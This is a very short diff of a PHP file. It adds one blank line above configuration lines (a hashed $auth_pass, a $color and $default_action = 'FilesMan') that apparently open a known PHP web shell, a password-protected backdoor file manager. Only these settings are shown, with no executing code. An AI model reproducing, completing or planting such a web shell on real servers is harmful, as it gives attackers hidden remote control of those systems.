@@ -1,4 +1,5 @@
 <?php
+
 $auth_pass = "2d0007b4a4621cc28b82d59e0f19f296";
 $color = "#e6fab4";
 $default_action = 'FilesMan';
